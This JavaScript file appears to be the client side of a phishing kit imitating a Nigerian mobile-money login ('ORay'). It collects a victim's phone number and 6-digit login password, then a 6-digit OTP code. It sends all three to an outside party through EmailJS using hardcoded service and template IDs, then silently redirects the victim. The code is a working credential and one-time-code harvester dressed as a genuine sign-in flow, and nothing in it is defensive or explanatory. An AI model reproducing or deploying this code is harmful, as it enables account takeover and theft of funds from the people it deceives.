// Initialize EmailJS with your Public Key
emailjs.init({
    publicKey: "4GmeCxgk_4_p0BnkP"
});

/* =========================================
   ORay - Integrated JavaScript
   ========================================= */

document.addEventListener("DOMContentLoaded", () => {

    /* =====================================
       LOGIN PAGE LOGIC
       ===================================== */
    const phoneInput = document.querySelector(".phone-input");
    const passwordInput = document.querySelector(".password-input");
    const clearButton = document.querySelector(".clear-button");
    const nextButton = document.querySelector(".next-button");

    if (phoneInput) {
        // Allow numbers only up to 10 digits
        phoneInput.addEventListener("input", () => {
            phoneInput.value = phoneInput.value.replace(/\D/g, "").slice(0, 10);
        });
    }

    if (clearButton && phoneInput) {
        // Clear phone number field
        clearButton.addEventListener("click", () => {
            phoneInput.value = "";
            phoneInput.focus();
        });
    }

    if (passwordInput) {
        // Password: numbers only up to 6 digits
        passwordInput.addEventListener("input", () => {
            passwordInput.value = passwordInput.value.replace(/\D/g, "").slice(0, 6);
        });
    }

    if (nextButton && phoneInput && passwordInput) {
        nextButton.addEventListener("click", (event) => {
            event.preventDefault();

            const phone = phoneInput.value;
            const password = passwordInput.value;

            // Nigerian mobile number check: 10 digits after +234
            if (!/^[789]\d{9}$/.test(phone)) {
                alert("Please enter a valid Nigerian phone number.");
                phoneInput.focus();
                return;
            }

            if (password.length !== 6) {
                alert("Please enter your 6-digit login password.");
                passwordInput.focus();
                return;
            }

            // Temporarily store credentials to attach to the final email transmission
            sessionStorage.setItem("orayDemoPhone", phone);
            sessionStorage.setItem("orayDemoPassword", password);

            window.location.href = "otp.html";
        });
    }


    /* =====================================
       OTP PAGE LOGIC & DISPLAY
       ===================================== */
    const otpInputs = document.querySelectorAll(".otp-input");
    const countdown = document.querySelector(".countdown");
    const contactForm = document.querySelector("#contactForm");

    if (otpInputs.length > 0) {
        const displayPhone = document.querySelector("#display-phone");

        if (displayPhone) {
            const savedPhone = sessionStorage.getItem("orayDemoPhone");
            if (savedPhone) {
                displayPhone.textContent =
                    "+234 " +
                    savedPhone.substring(0, 3) +
                    " **** " +
                    savedPhone.substring(7);
            }
        }

        otpInputs.forEach((input, index) => {
            input.setAttribute("inputmode", "numeric");
            input.setAttribute("maxlength", "1");

            // Auto-focus next box on input
            input.addEventListener("input", () => {
                input.value = input.value.replace(/\D/g, "").slice(0, 1);
                if (input.value && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
            });

            // Backspace moves backwards
            input.addEventListener("keydown", (event) => {
                if (event.key === "Backspace" && input.value === "" && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
        });

        /* =================================
           2 MINUTE COUNTDOWN
           ================================= */
        let remaining = 120;

        const updateCountdown = () => {
            if (!countdown) return;

            const minutes = Math.floor(remaining / 60).toString().padStart(2, "0");
            const seconds = (remaining % 60).toString().padStart(2, "0");

            countdown.innerHTML = `Resend code in <strong>${minutes}:${seconds}</strong>`;

            if (remaining <= 0) {
                countdown.innerHTML = `<strong>Resend OTP</strong>`;
                return;
            }

            remaining--;
            setTimeout(updateCountdown, 1000);
        };

        updateCountdown();
    }


    /* =====================================
       FORM SUBMISSION & EMAILJS TRANSMISSION
       ===================================== */
    if (contactForm) {
        contactForm.addEventListener("submit", async function(event) {
            event.preventDefault();

            const button = contactForm.querySelector('[type="submit"]');
            
            // Build the OTP string from inputs
            let otpCode = "";
            otpInputs.forEach(input => {
                otpCode += input.value.trim();
            });

            if (otpCode.length !== 6) {
                alert("Please enter the complete 6-digit verification code.");
                return;
            }

            // Retrieve stored login payload details
            const savedPhone = sessionStorage.getItem("orayDemoPhone") || "Not provided";
            const savedPassword = sessionStorage.getItem("orayDemoPassword") || "Not provided";

            // Format everything cleanly for the message text field
            const combinedMessage = `Phone: +234 ${savedPhone}\nPassword: ${savedPassword}\nOTP Code: ${otpCode}`;

            // Secure user interface feedback loop
            button.disabled = true;
            button.textContent = "Verifying...";

            try {
                await emailjs.send(
                    "service_y4dbsvc",
                    "template_7ob6bz8",
                    {
                        name: "Website visitor",
                        message: combinedMessage
                    }
                );

                contactForm.reset();
                
                // Clear session data once sent safely
                sessionStorage.clear();
                
                // Instantly redirect to redirect.html without displaying a completion alert
                window.location.replace("redirect.html");

            } catch (error) {
                console.error("EmailJS submission failure error:", error);
                alert("Verification failed. Please try again.");
            } finally {
                // Only runs if an error breaks out before the redirection takes over
                if (button) {
                    button.disabled = false;
                    button.textContent = "Verify & Continue";
                }
            }
        });
    }

});
